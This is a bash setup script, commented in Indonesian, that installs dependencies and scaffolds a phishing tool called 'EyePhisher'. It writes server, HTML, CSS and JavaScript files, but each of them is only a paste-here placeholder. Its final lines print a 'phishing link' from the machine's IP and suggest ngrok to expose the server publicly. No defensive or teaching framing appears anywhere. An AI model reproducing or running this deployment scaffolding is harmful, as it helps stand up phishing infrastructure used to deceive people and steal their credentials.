#!/bin/bash
# setup.sh - Auto setup EyePhisher

echo "[+] Setting up EyePhisher..."
echo "[+] Installing dependencies..."

# Untuk Debian/Ubuntu
sudo apt-get update
sudo apt-get install -y python3 python3-pip

# Buat struktur direktori
mkdir -p templates static logs

# Generate file
cat > server.py << 'EOF'
[PASTE SERVER.PY CODE HERE]
EOF

cat > templates/index.html << 'EOF'
[PASTE INDEX.HTML CODE HERE]
EOF

cat > static/style.css << 'EOF'
[PASTE STYLE.CSS CODE HERE]
EOF

cat > static/script.js << 'EOF'
[PASTE SCRIPT.JS CODE HERE]
EOF

# Set permissions
chmod +x server.py

echo "[+] Setup complete!"
echo "[+] To start server: sudo python3 server.py"
echo "[+] Your phishing link: http://$(hostname -I | awk '{print $1}'):80"
echo "[+] Or use Ngrok for public link: ngrok http 80"
